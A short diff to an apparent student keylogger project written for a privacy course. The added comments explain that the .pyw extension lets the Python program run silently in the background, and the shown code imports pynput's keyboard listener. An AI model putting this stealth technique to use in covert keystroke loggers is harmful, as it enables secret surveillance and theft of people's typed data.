@@ -7,6 +7,8 @@
 # The purpose was to test to see how easy it can be to create
 # a piece of software that is potentially dangerous in invading
 # privacy, since privacy is a big topic in Computers and Society
+# The file format of this is .pyw. The .pyw extension allows for 
+# the python program to run silently in the background.
 
 # library
 from pynput.keyboard import Key, Listener
